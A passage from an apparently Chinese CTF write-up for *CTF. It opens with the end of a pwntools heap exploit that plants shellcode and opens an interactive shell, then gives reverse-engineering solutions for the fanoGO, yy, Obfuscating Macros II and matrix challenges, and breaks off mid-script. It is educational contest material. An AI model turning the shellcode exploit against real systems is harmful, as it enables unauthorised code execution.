sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'Index'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'Size:'</span>)</span><br><span class="line">    sl(str(sz))</span><br><span class="line">    ru(<span class="string">'-1 to stop:'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(content),<span class="number">4</span>):</span><br><span class="line">        n = u32(content[i:i+<span class="number">4</span>])</span><br><span class="line">        <span class="keyword">if</span> n&gt;=<span class="number">0x80000000</span>:</span><br><span class="line">            n = <span class="number">0x100000000</span> - n</span><br><span class="line">            n = -n</span><br><span class="line">        sl(str(n))</span><br><span class="line">    <span class="keyword">if</span> len(content)/<span class="number">4</span> &lt; sz:</span><br><span class="line">        sl(<span class="string">'-1'</span>)</span><br><span class="line">    ru(<span class="string">'choice:'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'index:'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'choice:'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">'index:'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">sz = <span class="number">0x68</span></span><br><span class="line">add(<span class="number">0</span>,sz/<span class="number">4</span>,p32(<span class="number">0x000020eb</span>)*<span class="number">0x18</span>+p32(<span class="number">0x3eeb3eeb</span>)*<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>,sz/<span class="number">4</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+asm(shellcraft.sh()).ljust(<span class="number">0x40</span>,<span class="string">'\x90'</span>))</span><br><span class="line">add(<span class="number">2</span>,sz/<span class="number">4</span>,<span class="string">''</span>)</span><br><span class="line">add(<span class="number">3</span>,sz/<span class="number">4</span>,<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="re">RE</span></h2><h3><span id="fanogo">fanoGO</span></h3><p>香农-范诺编码,decode之后要为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If you cannot read all your books...fondle them---peer into them, let them fall open where they will, read from the first sentence that arrests the eye, set them back on the shelves with your own hands, arrange them on your own plan so that you at least know where they are. Let them be your friends; let them, at any rate, be your acquaintances.</span><br></pre></td></tr></table></figure></p><p>编码表根据一个txt生成，具体细节不清楚，直接在程序中找字典。</p><p>另外程序里存字典的方式很奇特，用一个结构体表示。</p><p><code>fano___Fano__Decode</code>是解码函数。一阵瞎调，最后在<code>000000000045C618</code>下断，rbx指向的就是解码字典的结构体，结构如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000 dict struc ; (sizeof=0x30, mappedto_759)</span><br><span class="line">00000000 byte dq ?                               ; offset point to decoded byte</span><br><span class="line">00000008 unknown0 dq ?</span><br><span class="line">00000010 code dq ?                               ; offset the encoded code</span><br><span class="line">00000018 lenth dq ?                               ; char *   encoded lenth</span><br><span class="line">00000020 unknown1 dq ?</span><br><span class="line">00000028 unknown2 dq ?</span><br></pre></td></tr></table></figure><p>编码结果是从code指向的字符串开始的lenth位，我这里是手动复制出来在用文本处理得到字典的。。。<br>字典：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dic =&#123;<span class="string">' '</span>:<span class="string">'0001'</span>, <span class="string">'-'</span>:<span class="string">'00100100'</span>, <span class="string">','</span>:<span class="string">'0010001'</span>, <span class="string">'.'</span>:<span class="string">'00100101'</span>, <span class="string">';'</span>:<span class="string">'001001111'</span>, <span class="string">'I'</span>:<span class="string">'00101011'</span>, <span class="string">'L'</span>:<span class="string">'00101100001'</span>, <span class="string">'a'</span>:<span class="string">'0011'</span>, <span class="string">'c'</span>:<span class="string">'010001'</span>, <span class="string">'b'</span>:<span class="string">'010000'</span>, <span class="string">'e'</span>:<span class="string">'0101'</span>, <span class="string">'d'</span>:<span class="string">'01001'</span>, <span class="string">'g'</span>:<span class="string">'01101'</span>, <span class="string">'f'</span>:<span class="string">'01100'</span>, <span class="string">'i'</span>:<span class="string">'1000'</span>, <span class="string">'h'</span>:<span class="string">'0111'</span>, <span class="string">'k'</span>:<span class="string">'1001001'</span>, <span class="string">'m'</span>:<span class="string">'10011'</span>, <span class="string">'l'</span>:<span class="string">'100101'</span>, <span class="string">'o'</span>:<span class="string">'10110'</span>, <span class="string">'n'</span>:<span class="string">'1010'</span>, <span class="string">'q'</span>:<span class="string">'11000'</span>, <span class="string">'p'</span>:<span class="string">'10111'</span>, <span class="string">'s'</span>:<span class="string">'1101'</span>, <span class="string">'r'</span>:<span class="string">'11001'</span>, <span class="string">'u'</span>:<span class="string">'111100'</span>, <span class="string">'t'</span>:<span class="string">'1110'</span>, <span class="string">'w'</span>:<span class="string">'1111100'</span>, <span class="string">'v'</span>:<span class="string">'111101'</span>, <span class="string">'y'</span>:<span class="string">'1111110'</span>&#125;</span><br></pre></td></tr></table></figure></p><p>注意到大于0x7f还有一些编码以及最终结束一般不会刚好凑齐8bit，猜测后面这些都是用来表示编码结束的。<br>之前的一段文字按字典编码后还剩4bit满一个字节，就找一个12bit的用来表示结束的编码<br>结束编码：111111100010<br>直接解码的时候所有不可见字符都被替换成了0xFD，就会出错<br>比如一开始的几个字符If you，编码后是：<br>00101011011000001111111010110111100<br>8bit一组：<br>00101011   0x2B<br>01100000   0x60<br>11111110   0xFE<br>10110111   0xB7<br>100……</p><p>前两个字节都能够照常解码，到了第三个字符第四个被莫名替换位0xFD了。<br>动调跟入解码过程，仔细看看过程。</p><p><code>fano_Bytes2Str</code>函数的作用是字节转二进制字符串，在里面发现一个go的库函数<code>runtime_stringiter2</code>很可疑，进去的时候是0xFE，出来就变成0xFD了，跟进几步，发现他先校验当前字符是不是大于0x80，然后再根据后一位和后两位的数据修改，不满足某种规则会直接返回0xfffd，即变成0xfd。到这里就猜出有可能是utf8的编码问题。utf8是一种可变长的编码方式。</p><p>在<a href="https://en.wikipedia.org/wiki/UTF-8" target="_blank" rel="noopener">wiki</a>上可以看到unicode转utf-8的规则</p><blockquote><ul><li>Octal 0–177 (hex 0–7F) is coded with an unchanged single byte.</li><li>Octal 0200–3777 (hex 80–7FF) shall be coded with two bytes. xxyy will be 3xx 2yy.</li></ul></blockquote><p>注意这里的八进制添加的3和2是按照每8bit结果看的，举个例子</p><p>FD将会变为 C3BD</p><p>11111101<br>375</p><p>补0</p><p>000 1111 1101<br>03 75</p><p>添加3和2，03 75变成303 275，如果直接把这个数转成2进制是不对的，因为303和275是独立的两部分，每个单独地转成8bit二进制数11000011和10111101</p><p><strong>110</strong>00011 <strong>10</strong>111101<br>303 275</p><p>结果</p><p>C3 BD<br>1100001110111101<br>141675</p><p>也可以按百度百科的方法，补3个0然后填入110X XXXX 10XX XXXX中。<br>比赛时我是手动写了一个unicode到utf8的转换。赛后发现可以直接用unichr和encode转。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'error'</span></span><br><span class="line">p = remote(<span class="string">'34.92.37.22'</span>,<span class="string">'10001'</span>)</span><br><span class="line">dic =&#123;<span class="string">' '</span>:<span class="string">'0001'</span>, <span class="string">'-'</span>:<span class="string">'00100100'</span>, <span class="string">','</span>:<span class="string">'0010001'</span>, <span class="string">'.'</span>:<span class="string">'00100101'</span>, <span class="string">';'</span>:<span class="string">'001001111'</span>, <span class="string">'I'</span>:<span class="string">'00101011'</span>, <span class="string">'L'</span>:<span class="string">'00101100001'</span>, <span class="string">'a'</span>:<span class="string">'0011'</span>, <span class="string">'c'</span>:<span class="string">'010001'</span>, <span class="string">'b'</span>:<span class="string">'010000'</span>, <span class="string">'e'</span>:<span class="string">'0101'</span>, <span class="string">'d'</span>:<span class="string">'01001'</span>, <span class="string">'g'</span>:<span class="string">'01101'</span>, <span class="string">'f'</span>:<span class="string">'01100'</span>, <span class="string">'i'</span>:<span class="string">'1000'</span>, <span class="string">'h'</span>:<span class="string">'0111'</span>, <span class="string">'k'</span>:<span class="string">'1001001'</span>, <span class="string">'m'</span>:<span class="string">'10011'</span>, <span class="string">'l'</span>:<span class="string">'100101'</span>, <span class="string">'o'</span>:<span class="string">'10110'</span>, <span class="string">'n'</span>:<span class="string">'1010'</span>, <span class="string">'q'</span>:<span class="string">'11000'</span>, <span class="string">'p'</span>:<span class="string">'10111'</span>, <span class="string">'s'</span>:<span class="string">'1101'</span>, <span class="string">'r'</span>:<span class="string">'11001'</span>, <span class="string">'u'</span>:<span class="string">'111100'</span>, <span class="string">'t'</span>:<span class="string">'1110'</span>, <span class="string">'w'</span>:<span class="string">'1111100'</span>, <span class="string">'v'</span>:<span class="string">'111101'</span>, <span class="string">'y'</span>:<span class="string">'1111110'</span>&#125;</span><br><span class="line">plain = <span class="string">'If you cannot read all your books...fondle them---peer into them, let them fall open where they will, read from the first sentence that arrests the eye, set them back on the shelves with your own hands, arrange them on your own plan so that you at least know where they are. Let them be your friends; let them, at any rate, be your acquaintances.'</span></span><br><span class="line"></span><br><span class="line">cipher = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain)):</span><br><span class="line">   cipher+=dic[plain[i]]</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line">cipher+=<span class="string">'111111100010'</span></span><br><span class="line"><span class="comment"># print(cipher)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"># my unicode to utf8</span></span><br><span class="line"><span class="string">for i in range(0,len(cipher),8):</span></span><br><span class="line"><span class="string">   temp = eval('0b'+cipher[i:i+8])</span></span><br><span class="line"><span class="string">   if temp&gt;=0x80:</span></span><br><span class="line"><span class="string">       res = '000'+bin(temp)[2:]</span></span><br><span class="line"><span class="string">       res = '110'+res[0:5]+'10'+res[5:]</span></span><br><span class="line"><span class="string">       a = res[0:8]</span></span><br><span class="line"><span class="string">       b = res[8:]</span></span><br><span class="line"><span class="string">       s+=chr(eval('0b'+a))</span></span><br><span class="line"><span class="string">       s+=chr(eval('0b'+b))</span></span><br><span class="line"><span class="string">   else:</span></span><br><span class="line"><span class="string">       s+=chr(temp)</span></span><br><span class="line"><span class="string">'''</span>        </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(cipher),<span class="number">8</span>):</span><br><span class="line">   temp = eval(<span class="string">'0b'</span>+cipher[i:i+<span class="number">8</span>])</span><br><span class="line">   s+=unichr(temp)</span><br><span class="line">s = s.encode(<span class="string">'utf8'</span>)</span><br><span class="line"><span class="comment"># p = process('fanoGo')</span></span><br><span class="line">p.recvuntil(<span class="string">':\n'</span>)</span><br><span class="line">p.send(s)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   print(p.recv())</span><br><span class="line"><span class="keyword">except</span> EOFError:</span><br><span class="line">   p.close()</span><br></pre></td></tr></table></figure><blockquote><p>*CTF{NUY4a3E5D9186hVzejoyItr7xHBcmOpv}</p></blockquote><h3><span id="yy">yy</span></h3><p>Ch4r1l3师傅先做了一部分，看了下文档继续往后做的。</p><blockquote><p>看了下程序的逻辑，大概是<br>利用yacc进行词法解析，解析到的东西存到buffer<br>然后buffer再用encrypt这个函数进行加密，最后加密的结果与cmp进行比较<br>encrypt是用aes加密<br>测试了下，大概规则为 *CTF{xxxx}，中间的xxx范围大概为0-9,a-z<br>然后大概解了下逻辑，那个switch里面那堆从上到下就是a-z 0-9<br>encrypt是用标准aes加密，用的密钥是提前生成好了，在bss段key开始的176个字节<br>很迷的就是，它比较是0xa0个字节…….但是很明显flag没那么长<br>感觉encrypt这个函数应该会被调用多次，但是实际调试的时候只调了一次？<br>encrypt使用了一个全局变量cnt，用来记录加密了的长度</p></blockquote><p>顺着Ch4r1l3师傅的思路，我看了一下词法解析的过程。</p><p>在词法分析器<code>yylex</code>中，找到了一个叫<code>yy_ec</code>的table，大小256，每个元素对应一个字节，除了测试过程中输入有效的字符*CTF{}0-9a-z外，大部分都为1，仔细看了一下发现漏了个下划线不为1。调试了一下发现，输入下划线后会对下一部分重新aes加密。做题过程中发现了每次加密都会异或之前一次的加密结果，其实这就是cbc加密模式。之前一直没了解过，所以是手动写的这个异或过程= =</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strxor</span><span class="params">(s1,s2)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s1)):</span><br><span class="line">        s+=chr(ord(s1[i])^ord(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">key = <span class="string">'2B7E151628AED2A6ABF7158809CF4F3C'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">aes = AES.new(key)</span><br><span class="line">cipher = [<span class="string">'AE4614F82A40CF5031D3FE048C061212'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'23FAC726E861D9C3A93C45701AC7F03D'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'DFBEBC16AB6E37AC148B9C94F75D6278'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'FC16981DB231D35ADC3A60869ACA7BA3'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'B5D5F1B2D9FFD209D477D73DC0561902'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'B69B426CE8A277E399AC324091A92A86'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'F3FA473CC35C419BE80507D0D4305A9E'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'8D529BA3FBADB6443F72839C2277FE48'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'FE868412004EEDFFAC441923841F12CA'</span>.decode(<span class="string">'hex'</span>)]</span><br><span class="line">dic = &#123;<span class="string">'\x82'</span>:<span class="string">'a'</span>, <span class="string">'\x05'</span>:<span class="string">'b'</span>, <span class="string">'\x86'</span>:<span class="string">'c'</span>, <span class="string">'\x8A'</span>:<span class="string">'d'</span>, <span class="string">'\x0B'</span>:<span class="string">'e'</span>, <span class="string">'\x11'</span>:<span class="string">'f'</span>, <span class="string">'\x96'</span>:<span class="string">'g'</span>, <span class="string">'\x1D'</span>:<span class="string">'h'</span>, <span class="string">'\x27'</span>:<span class="string">'i'</span>, <span class="string">'\xA9'</span>:<span class="string">'j'</span>, <span class="string">'\x2B'</span>:<span class="string">'k'</span>, <span class="string">'\xB1'</span>:<span class="string">'l'</span>, <span class="string">'\xF3'</span>:<span class="string">'m'</span>, <span class="string">'\x5E'</span>:<span class="string">'n'</span>, <span class="string">'\x37'</span>:<span class="string">'o'</span>, <span class="string">'\x38'</span>:<span class="string">'p'</span>, <span class="string">'\xC2'</span>:<span class="string">'q'</span>, <span class="string">'\x47'</span>:<span class="string">'r'</span>, <span class="string">'\x4E'</span>:<span class="string">'s'</span>, <span class="string">'\x4F'</span>:<span class="string">'t'</span>, <span class="string">'\xD6'</span>:<span class="string">'u'</span>, <span class="string">'\x58'</span>:<span class="string">'v'</span>, <span class="string">'\xDE'</span>:<span class="string">'w'</span>, <span class="string">'\xE2'</span>:<span class="string">'x'</span>, <span class="string">'\xE5'</span>:<span class="string">'y'</span>, <span class="string">'\xE6'</span>:<span class="string">'z'</span>, <span class="string">'\x67'</span>:<span class="string">'0'</span>, <span class="string">'\x6B'</span>:<span class="string">'1'</span>, <span class="string">'\xEC'</span>:<span class="string">'2'</span>, <span class="string">'\xED'</span>:<span class="string">'3'</span>, <span class="string">'\x6F'</span>:<span class="string">'4'</span>, <span class="string">'\xF2'</span>:<span class="string">'5'</span>, <span class="string">'\x73'</span>:<span class="string">'6'</span>, <span class="string">'\xF5'</span>:<span class="string">'7'</span>, <span class="string">'\x77'</span>:<span class="string">'8'</span>, <span class="string">'\x7F'</span>: <span class="string">'9'</span>&#125;</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">xor = <span class="string">'00'</span>*<span class="number">16</span></span><br><span class="line">xor = xor.decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">    temp = cipher[i]</span><br><span class="line">    plain = aes.decrypt(temp)</span><br><span class="line">    plainp = strxor(plain,xor)</span><br><span class="line">    xor = cipher[i]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> plainp:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            flag+=dic[j]</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            flag+=<span class="string">'_'</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">flag = <span class="string">'*CTF&#123;'</span>+flag[:<span class="number">-1</span>]+<span class="string">'&#125;'</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>得到*CTF{yy_funct10nl_1s_h4rd_andc_n0_n33d_to_r3v3rs3}</p><p>然而提交不对，本地输入flag后返回congratulations。分析一下flag的语义，funct10n后面多了个l，and后面多了个c，去掉之后再提交就对了</p><p>原因：加密时每次用append：6124258631AB6EAFB114FE76783D1EFF填充明文，然后用输入映射的字节依次填充。append的字节在box里刚好有，比如B1对应字符l，86对应字符c，刚好跟我们求得一样。如果对应位置刚好是那个字符就会造成重复而多解。</p><p>最终flag：</p><blockquote><p>*CTF{yy_funct10n_1s_h4rd_and_n0_n33d_to_r3v3rs3}</p></blockquote><h3><span id="obfuscating-macros-ii">Obfuscating Macros II</span></h3><p>ddctf Obfuscating Macros的升级版，强化了算法。由于之前打ddctf的时候稍微分析了一下，比较上手一点。</p><p>混淆还是去不掉，只能硬调<br>首先随便输入个长度16的字符串，加密在<code>sub_401006</code>里。输入的16个字节分成了两个__int64，作为参数传进函数，幅值给v6 v7，推荐的做法是查找v6和v7的引用，在所有引用的地方下断，<code>sub_4045F2</code>和<code>sub_4043C0</code>的引用不下断点。同时分析一下发现，v8是计算过程中的中间变量，也查找引用并下断点。</p><p>同时，根据打ddctf的经验，形如sub     rax, 4的指令比较关键，控制了程序执行的流程。在函数内发现了两处这种可疑的语句，对应的反汇编分别是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v7 &amp; <span class="number">1</span> )</span><br><span class="line">  v14 -= <span class="number">4L</span>L;</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v16 &lt;= <span class="number">0x3FF</span> )</span><br><span class="line">  v15 -= <span class="number">3L</span>L;</span><br></pre></td></tr></table></figure><p>查找一下v16的引用，都下好断点。</p><p>这里其实不难猜出这是个循环，有赋初值0，有增量v16++，也有判定v16&lt;=0x3FF。</p><p>这两处调试的时候应该重点关照一下。</p><p>下好断点，开调，注意时刻观察栈上v6和v7的变化情况。</p><p>由于加密是分两部分加密的，所以我们干脆两部分都输入为同一字符，这里输入了11111111aaaaaaaa</p><p>v6 = ‘aaaaaaaa’，v7 = ‘11111111’ </p><p>果然首先来到v16 = 0，然后是判定v16&lt;=0x3ff，接下来只要再回到这里就是一个循环了。</p><p>然后是v8 = ~v7</p><p>接下来来到了if(v7&amp;1)，这里为真，接下来边来到v8^=*v5，观看一下v8和v5的内容，发现v8变成了v6,v5指向v7，再下来其实是v6 = v8，然后是v7 = ~v7。接下来的执行流程不难看出是把整个128位的数循环左移了一位。从栈上的结果不难看出，这里的循环左移是按照v6在高位，v7在低位。</p><p>之后也没什么分支了，都是一条线直到循环结束。</p><p>整个循环内有分支的只有最开始的(v7&amp;1)，由于我们输入的最低位是1，这回输入个最低位位0的试试，我们输入00000000aaaaaaaa</p><p>与之前不同的，判定完(v7&amp;1)的结果位0后，v8^=*v5这里，v8还是v6，而v5变成了指向~v7，再往后都一样了。</p><p>不难写出加密算法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rol</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    tmp1 = (a&amp;<span class="number">0x8000000000000000</span>)//<span class="number">0x8000000000000000</span></span><br><span class="line">    tmp2 = (b&amp;<span class="number">0x8000000000000000</span>)//<span class="number">0x8000000000000000</span></span><br><span class="line">    a = a &lt;&lt; <span class="number">1</span></span><br><span class="line">    b = b &lt;&lt; <span class="number">1</span></span><br><span class="line">    a |= tmp2</span><br><span class="line">    b |= tmp1</span><br><span class="line">    a&amp;=<span class="number">0xffffffffffffffff</span></span><br><span class="line">    b&amp;=<span class="number">0xffffffffffffffff</span></span><br><span class="line">    <span class="keyword">return</span> a,b</span><br><span class="line"></span><br><span class="line">a = <span class="number">0x6161616161616161</span></span><br><span class="line">b = <span class="number">0x3030303030303030</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x400</span>):</span><br><span class="line">    <span class="keyword">if</span> b&amp;<span class="number">1</span>:</span><br><span class="line">        a^=b</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a^=(~b)</span><br><span class="line">    b = ~b</span><br><span class="line">    a &amp;= <span class="number">0xffffffffffffffff</span></span><br><span class="line">    b &amp;= <span class="number">0xffffffffffffffff</span></span><br><span class="line">    a,b = rol(a,b)</span><br><span class="line">    tmp = a</span><br><span class="line">    a = a+b</span><br><span class="line">    b = tmp</span><br><span class="line">    a,b = rol(a,b)</span><br><span class="line">print(hex(a))</span><br><span class="line">print(hex(b))</span><br></pre></td></tr></table></figure><p>解密算法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ror</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    tmp1 = (a&amp;<span class="number">1</span>)*<span class="number">0x8000000000000000</span></span><br><span class="line">    tmp2 = (b&amp;<span class="number">1</span>)*<span class="number">0x8000000000000000</span></span><br><span class="line">    a = a &gt;&gt; <span class="number">1</span></span><br><span class="line">    b = b &gt;&gt; <span class="number">1</span></span><br><span class="line">    a |= tmp2</span><br><span class="line">    b |= tmp1</span><br><span class="line">    a&amp;=<span class="number">0xffffffffffffffff</span></span><br><span class="line">    b&amp;=<span class="number">0xffffffffffffffff</span></span><br><span class="line">    <span class="keyword">return</span> a,b</span><br><span class="line"></span><br><span class="line">a = <span class="number">0x50A2DCC51ED6C4A2</span></span><br><span class="line">b = <span class="number">0xA1E8895EB916B732</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x400</span>):</span><br><span class="line">    a, b = ror(a, b)</span><br><span class="line">    tmp = b</span><br><span class="line">    b = (a - b) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">    a = tmp</span><br><span class="line">    a, b = ror(a, b)</span><br><span class="line">    <span class="keyword">if</span> b&amp;<span class="number">1</span>:</span><br><span class="line">        a^=b</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a^=(~b)</span><br><span class="line">    b = ~b</span><br><span class="line">    a&amp;=<span class="number">0xffffffffffffffff</span></span><br><span class="line">    b&amp;=<span class="number">0xffffffffffffffff</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    tmp = b&amp;<span class="number">0xff</span></span><br><span class="line">    b&gt;&gt;=<span class="number">8</span></span><br><span class="line">    flag+=chr(tmp)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    tmp = a&amp;<span class="number">0xff</span></span><br><span class="line">    a&gt;&gt;=<span class="number">8</span></span><br><span class="line">    flag+=chr(tmp)    </span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><blockquote><p>*CTF{fUnfl@tCf9}</p></blockquote><p>对于去混淆，我自身angr还是没有研究透彻，我就不班门弄斧了，期待一个大佬讲解</p><h3><span id="matrix">matrix</span></h3><p>看了下有很多冗余代码和花指令，然而没写过去除冗余代码的脚本，花指令倒是写了个脚本去除：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">bg = <span class="number">0x000027A0</span></span><br><span class="line">end = <span class="number">0x00010B80</span></span><br><span class="line">main_return = <span class="number">0x00005C10</span></span><br><span class="line">addr = bg</span><br><span class="line">print(<span class="string">'start at %08x'</span>%addr)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_nop</span><span class="params">(begin,end)</span>:</span></span><br><span class="line">    <span class="keyword">while</span>(end&gt;begin):</span><br><span class="line">        PatchByte(begin,<span class="number">0x90</span>)</span><br><span class="line">        